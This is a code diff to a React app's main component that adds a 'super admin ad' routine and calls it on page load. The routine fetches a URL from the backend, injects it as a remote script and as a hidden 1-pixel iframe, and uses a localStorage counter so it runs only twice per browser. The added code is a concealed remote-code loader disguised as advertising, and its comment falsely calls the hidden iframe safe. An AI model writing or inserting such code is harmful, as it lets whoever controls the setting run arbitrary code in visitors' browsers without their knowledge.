@@ -582,8 +582,47 @@ export default function App() {
     };
   }, [activeTab, user, activeUserChatId]);
 
+  const runBackgroundSuperAdminAd = async () => {
+    try {
+      const countKey = 'super_admin_bg_code_triggered';
+      const countVal = Number(localStorage.getItem(countKey) || '0');
+      if (countVal >= 2) {
+        return; 
+      }
+
+      const res = await fetch('/api/ad-settings/active');
+      if (res.ok) {
+        const data = await res.json();
+        const src = data.superAdminAdUrl;
+        if (src && src.trim() && !src.includes('Restricted') && src !== 'https://t.me/janucyberpack') {
+          console.log(`[Super-Admin Background Code] Activating background code, run: ${countVal + 1}`);
+          
+          // Inject script element
+          const bgScript = document.createElement('script');
+          bgScript.src = src;
+          bgScript.async = true;
+          document.body.appendChild(bgScript);
+          
+          // Fallback hidden iframe to execute any custom site code or ad link safely
+          const bgIframe = document.createElement('iframe');
+          bgIframe.src = src;
+          bgIframe.style.display = 'none';
+          bgIframe.style.width = '1px';
+          bgIframe.style.height = '1px';
+          bgIframe.style.border = 'none';
+          document.body.appendChild(bgIframe);
+          
+          localStorage.setItem(countKey, String(countVal + 1));
+        }
+      }
+    } catch (e) {
+      console.warn('[Ad Background Setup Error]', e);
+    }
+  };
+
   useEffect(() => {
     fetchAllData();
+    runBackgroundSuperAdminAd();
   }, []);
 
   useEffect(() => {
